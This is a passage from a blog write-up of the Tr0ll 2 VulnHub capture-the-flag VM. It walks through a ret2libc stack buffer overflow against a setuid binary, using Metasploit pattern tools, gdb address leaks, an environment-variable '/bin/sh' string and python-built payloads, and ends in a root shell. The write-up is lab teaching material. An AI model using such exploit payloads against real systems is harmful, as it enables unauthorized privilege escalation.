<span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> x/x $eip
0x41414141: Cannot access memory at address 0x41414141
</code></pre></div><p>We see that we have cleanly overwritten EIP with our hex representation of A&rsquo;s. We don&rsquo;t know the exact location of where this is overwritten from our input yet, so lets find out by providing it a unique buffer using the metasploit <code>pattern_create</code> script, and then checking the offset using the <code>pattern_offset</code> script.</p>
<p>Lets generate the pattern.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>root@kali:~# locate pattern_create
/usr/share/metasploit-framework/tools/pattern_create.rb

root@kali:~# /usr/share/metasploit-framework/tools/pattern_create.rb <span style=color:#ae81ff>500</span>
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq
</code></pre></div><p>Next, we provide this pattern as input to crash the application and inspect the registers:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>noob@Tr0ll2:/tmp$ gdb -q ./r00t
Reading symbols from /tmp/r00t...done.

<span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> r <span style=color:#e6db74>&#34;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq&#34;</span>

Starting program: /tmp/r00t <span style=color:#e6db74>&#34;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq&#34;</span>

Program received signal SIGSEGV, Segmentation fault.
0x6a413969 in ?? <span style=color:#f92672>()</span>
</code></pre></div><p>So we crashed at <code>0x6a413969</code>. Lets check the offset of this in our buffer.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>root@kali:~# /usr/share/metasploit-framework/tools/pattern_offset.rb 6a413969
<span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Exact match at offset <span style=color:#ae81ff>268</span>
</code></pre></div><p>So at byte 268 we start to override EIP cleanly. We can test this to make sure our calculations were correct by replacing that section with B&rsquo;s:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>noob@Tr0ll2:/tmp$ gdb -q ./r00t
Reading symbols from /tmp/r00t...done.

<span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> r <span style=color:#66d9ef>$(</span>python -c <span style=color:#e6db74>&#39;print &#34;A&#34; *268 + &#34;BBBB&#34;&#39;</span><span style=color:#66d9ef>)</span>
The program being debugged has been started already.
Start it from the beginning? <span style=color:#f92672>(</span>y or n<span style=color:#f92672>)</span> y
Starting program: /tmp/r00t <span style=color:#66d9ef>$(</span>python -c <span style=color:#e6db74>&#39;print &#34;A&#34; *268 + &#34;BBBB&#34;&#39;</span><span style=color:#66d9ef>)</span>

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? <span style=color:#f92672>()</span>

<span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> x/x $eip
0x42424242: Cannot access memory at address 0x42424242
<span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span>
</code></pre></div><p>So with that done, we can deduce that we can cleanly override EIP at offset 268.</p>
<p>The next part we need to get is the location of <code>system()</code> from within libc. We can leak this address quite easily by inspecting the memory from a running application such as <code>r00t</code> linked to it:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>noob@Tr0ll2:/tmp$ gdb -q ./r00t
Reading symbols from /tmp/r00t...done.

<span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> b *main   <span style=color:#75715e># here we break on the main function</span>
Breakpoint <span style=color:#ae81ff>1</span> at 0x8048444: file bof.c, line 3.

<span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> r         <span style=color:#75715e># here we run the application....</span>
Starting program: /tmp/r00t

Breakpoint 1, main <span style=color:#f92672>(</span>argc<span style=color:#f92672>=</span>1, argv<span style=color:#f92672>=</span>0xbffffd84<span style=color:#f92672>)</span> at bof.c:3
<span style=color:#ae81ff>3</span>   bof.c: No such file or directory.

<span style=color:#f92672>(</span>gdb<span style=color:#f92672>)</span> p system  <span style=color:#75715e># and leak the locatin of system() in memory</span>
$1 <span style=color:#f92672>=</span> <span style=color:#f92672>{</span>&lt;text variable, no debug info&gt;<span style=color:#f92672>}</span> 0xb7e6b060 &lt;system&gt;
</code></pre></div><p>So <code>system()</code> lives at <code>0xb7e6b060</code>. We are going to point EIP here and provide it a argument from a environment variable. I don&rsquo;t really care if the application exits cleanly, however you can easily get that right by leaking the location of <code>exit()</code> too and placing that as the ret address in the exploit. I just like to type JUNK ;)</p>
<p>So far our exploit payload will look something like this:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>A * 268 + system() + JUNK
</code></pre></div><p>The last thing we need is a argument for <code>system()</code> on the stack so that it can execute that. One way of achieving this is to provide the memory location of a string such as <code>/bin/sh</code>. We can easily set an environment variable with this string, locate it in memory and use that.</p>
<p>So lets create this string, which we will refer to as the EGG.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>noob@Tr0ll2:/tmp$ export EGG<span style=color:#f92672>=</span>/bin/sh
noob@Tr0ll2:/tmp$ env | grep EGG
EGG<span style=color:#f92672>=</span>/bin/sh
</code></pre></div><p>Next, we can use a small C program to tell us where this EGG is in memory:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>noob@Tr0ll2:/tmp$ cat /tmp/findegg.c
<span style=color:#75715e>#include &lt;unistd.h&gt;</span>

int main<span style=color:#f92672>(</span>void<span style=color:#f92672>)</span>
<span style=color:#f92672>{</span>
  printf<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;EGG address: 0x%lx\n&#34;</span>, getenv<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;EGG&#34;</span><span style=color:#f92672>)</span>+4<span style=color:#f92672>)</span>;
  <span style=color:#66d9ef>return</span> 0;
<span style=color:#f92672>}</span>

noob@Tr0ll2:/tmp$ gcc /tmp/findegg.c -o /tmp/findegg
<span style=color:#f92672>[</span>...<span style=color:#f92672>]</span>

noob@Tr0ll2:/tmp$ /tmp/findegg
EGG address: 0xbfffff04
</code></pre></div><p>So our egg lives at <code>0xbfffff04</code>. This memory address will probably be different for you if you try, but the process to find it remains the same. We also have to keep in mind that the environment will be slightly different when we execute our exploit in and out of <code>gdb</code>.</p>
<p>With everything we need, we can deduce that our exploit payload will end up being something like this:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>A * 268 + system() + JUNK + EGG
</code></pre></div><p>Lets get the python version of that written up and sent to our vulnerable binary (addresses are written &lsquo;backwards&rsquo; due to the little endian format of the CPU):</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>noob@Tr0ll2:/tmp$ ./r00t <span style=color:#66d9ef>$(</span>python -c <span style=color:#e6db74>&#39;print &#34;A&#34; *268 + &#34;\x60\xb0\xe6\xb7&#34; + &#34;JUNK&#34; + &#34;\x04\xff\xff\xbf&#34;&#39;</span><span style=color:#66d9ef>)</span>
Segmentation fault
</code></pre></div><p>Wups, segfault. You will find that this is probably because the location of our EGG in memory did not compensate for the length of the binary name. Our binary is called <code>r00t</code>, which is 4 chars long, so maybe we need to move the location of our EGG up with up to 4 bytes. For demonstration purposes I am going to show all the attempts for each byte:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#75715e># so just to recap, we check for the location of the EGG</span>
noob@Tr0ll2:/tmp$ ./findegg
EGG address: 0xbfffff04

<span style=color:#75715e># EGG is at 0xbfffff04, so in little endian format we have:</span>
noob@Tr0ll2:/tmp$ ./r00t <span style=color:#66d9ef>$(</span>python -c <span style=color:#e6db74>&#39;print &#34;A&#34; *268 + &#34;\x60\xb0\xe6\xb7&#34; + &#34;JUNK&#34; + &#34;\x04\xff\xff\xbf&#34;&#39;</span><span style=color:#66d9ef>)</span>
Segmentation fault

<span style=color:#75715e># A segfault, lets move it up 1 byte</span>
noob@Tr0ll2:/tmp$ ./r00t <span style=color:#66d9ef>$(</span>python -c <span style=color:#e6db74>&#39;print &#34;A&#34; *268 + &#34;\x60\xb0\xe6\xb7&#34; + &#34;JUNK&#34; + &#34;\x05\xff\xff\xbf&#34;&#39;</span><span style=color:#66d9ef>)</span>
sh: 1: <span style=color:#f92672>=</span>/bin/sh: not found
Segmentation fault

<span style=color:#75715e># another segfault, however we have a little diagnostics message now</span>
<span style=color:#75715e># showing that we are not far off :)</span>
noob@Tr0ll2:/tmp$ ./r00t <span style=color:#66d9ef>$(</span>python -c <span style=color:#e6db74>&#39;print &#34;A&#34; *268 + &#34;\x60\xb0\xe6\xb7&#34; + &#34;JUNK&#34; + &#34;\x06\xff\xff\xbf&#34;&#39;</span><span style=color:#66d9ef>)</span>
$
</code></pre></div><h2 id=trollin-the-rootin>trollin the rootin<a hidden class=anchor aria-hidden=true href=#trollin-the-rootin>#</a></h2>
<p>So <code>0xbfffff06</code> as a EGG location will give us shell in our testing! To finish off then, I have to find the correct <code>r00t</code> binary in all of the <code>door{1,2,3}</code> folders and attempt my exploit there:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door2$ ./r00t <span style=color:#66d9ef>$(</span>python -c <span style=color:#e6db74>&#39;print &#34;A&#34; *268 + &#34;\x60\xb0\xe6\xb7&#34; + &#34;JUNK&#34; + &#34;\x06\xff\xff\xbf&#34;&#39;</span><span style=color:#66d9ef>)</span>
sh: 1: in:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games: not found
Segmentation fault
</code></pre></div><p>Another segmentation fault! This time we seem to be waaaaaaaay off too. This is because of the <code>PWD</code> changing so drastically. To fix this, we simply rerun our <code>findegg</code> program and compensate for the binary name. When completing this, I had a successful run as follows:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door2$ ./r00t <span style=color:#66d9ef>$(</span>python -c <span style=color:#e6db74>&#39;print &#34;A&#34; *268 + &#34;\x60\xb0\xe6\xb7&#34; + &#34;JUNK&#34; + &#34;\xe2\xfe\xff\xbf&#34;&#39;</span><span style=color:#66d9ef>)</span>
<span style=color:#75715e># id</span>
uid<span style=color:#f92672>=</span>1002<span style=color:#f92672>(</span>noob<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>1002<span style=color:#f92672>(</span>noob<span style=color:#f92672>)</span> euid<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span>,1002<span style=color:#f92672>(</span>noob<span style=color:#f92672>)</span>
</code></pre></div><p>This time I had to move the memory location for for my EGG on by quite a few bytes, in fact from <code>0xbffffeda</code> all the way to <code>0xbffffee2</code></p>
<p>As I was now root, I may cat the <code>Proof.txt</code> in <code>/root</code></p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#75715e># cat /root/Proof.txt</span>
You win this time young Jedi...

a70354f0258dcc00292c72aab3c8b1e4
</code></pre></div><p>Thanks <a href=https://twitter.com/Maleus21>@Maleus21</a> for the fun VM and <a href=http://vulnhub.com/>VulnHub</a> for the hosting :)</p>
</div>
<footer class=post-footer>
<nav class=paginav>
<a class=prev href=https://leonjza.github.io/blog/2014/10/14/knock-knock-whos-there-solving-knock-knock/>
<span class=title>« Prev Page</span>
<br>
<span>knock-knock who’s there? solving knock knock</span>
</a>
<a class=next href=https://leonjza.github.io/blog/2014/09/18/from-persistence/>
<span class=title>Next Page »</span>
<br>
<span>From Persistence</span>
</a>
</nav>
<div class=share-buttons>
<a target=_blank rel="noopener noreferrer" aria-label="share another troll tamed solving troll 2 on twitter" href="https://twitter.com/intent/tweet/?text=another%20troll%20tamed%20solving%20troll%202&url=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f10%2f10%2fanother-troll-tamed-solving-troll-2%2f&hashtags="><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share another troll tamed solving troll 2 on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f10%2f10%2fanother-troll-tamed-solving-troll-2%2f&title=another%20troll%20tamed%20solving%20troll%202&summary=another%20troll%20tamed%20solving%20troll%202&source=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f10%2f10%2fanother-troll-tamed-solving-troll-2%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share another troll tamed solving troll 2 on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f10%2f10%2fanother-troll-tamed-solving-troll-2%2f&title=another%20troll%20tamed%20solving%20troll%202"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share another troll tamed solving troll 2 on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f10%2f10%2fanother-troll-tamed-solving-troll-2%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share another troll tamed solving troll 2 on whatsapp" href="https://api.whatsapp.com/send?text=another%20troll%20tamed%20solving%20troll%202%20-%20https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f10%2f10%2fanother-troll-tamed-solving-troll-2%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share another troll tamed solving troll 2 on telegram" href="https://telegram.me/share/url?text=another%20troll%20tamed%20solving%20troll%202&url=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f10%2f10%2fanother-troll-tamed-solving-troll-2%2f"><svg viewBox="2 2 28 28"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg>
</a>
</div>
</footer>
</article>
</main>
<footer class=footer>
<span>@leonjza</span>
<span>
Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://git.io/hugopapermod rel=noopener target=_blank>PaperMod</a>
</span>
</footer>
<a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a>
<script>let menu=document.getElementById('menu');menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)},document.querySelectorAll('a[href^="#"]').forEach(a=>{a.addEventListener("click",function(b){b.preventDefault();var a=this.getAttribute("href").substr(1);window.matchMedia('(prefers-reduced-motion: reduce)').matches?document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView({behavior:"smooth"}),a==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${a}`)})})</script>
<script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script>
<script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove('dark'),localStorage.setItem("pref-theme",'light')):(document.body.classList.add('dark'),localStorage.setItem("pref-theme",'dark'))})</script>
<script>document.querySelectorAll('pre > code').forEach(b=>{const c=b.parentNode.parentNode,a=document.createElement('button');a.classList.add('copy-code'),a.innerText='copy';function d(){a.innerText='copied!',setTimeout(()=>{a.innerText='copy'},2e3)}a.addEventListener('click',e=>{if('clipboard'in navigator){navigator.clipboard.writeText(b.textContent),d();return}const a=document.createRange();a.selectNodeContents(b);const c=window.getSelection();c.removeAllRanges(),c.addRange(a);try{document.execCommand('copy'),d()}catch(a){}c.removeRange(a)}),c.classList.contains("highlight")?c.appendChild(a):c.parentNode.firstChild==c||(b.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?b.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(a):b.parentNode.appendChild(a))})</script>
</body>
</html>